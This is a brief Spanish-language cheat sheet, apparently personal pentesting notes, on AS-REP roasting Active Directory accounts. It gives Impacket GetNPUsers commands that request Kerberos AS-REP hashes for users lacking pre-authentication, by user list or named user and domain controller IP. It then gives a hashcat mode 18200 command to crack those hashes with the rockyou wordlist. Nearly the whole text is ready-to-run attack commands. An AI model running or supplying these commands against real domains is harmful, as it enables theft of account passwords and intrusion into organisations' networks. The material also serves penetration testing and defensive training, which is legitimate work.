# ASREProstable 

Tags: #AD #ASREProstable #Impacket #Kali #Parrot #HashCat 

## Explotar con Impacket

```bash 
❯ impacket-GetNPUsers -no-pass -usersfile users.txt domain.corp/        # Ataque usando un lista de usuarios 

❯ impacket-GetNPUsers 'domain1.corp/user' -no-pass -dc-ip 18.116.10.36 -request

	# domain1.corp/user = Usuario vulnerable o lista de usuarios 
	# no-pass = No hay una contraseña 
	# dc-ip = Ip del DC

Notas:
	1. Tener la IP con el dominio en '/etc/hosts'
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 18200 = Es un ASREProstable
	# hashes.asreproast = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```